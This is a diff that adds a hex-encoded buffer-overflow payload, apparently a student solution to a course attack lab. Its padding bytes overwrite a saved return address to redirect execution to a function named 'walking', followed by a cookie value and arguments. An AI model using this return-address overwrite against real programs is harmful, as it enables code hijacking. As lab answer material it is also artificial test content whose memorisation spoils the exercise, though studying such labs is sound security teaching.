@@ -1,0 +1,17 @@
+31 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 /* Basic padding through buffer and ebp */
+cc 10 40 00 /* override stored rip to be walking's address */
+00 00 00 00 /* rip padding */
+00 00 00 00 /* following two lines are for the allocation */
+00 00 00 00
+93 e7 83 12 /* my cookie */
+08 00 00 00 /* 4 integers of value 8 (that sum for balance) */
+08 00 00 00
+08 00 00 00
+08 00 00 00
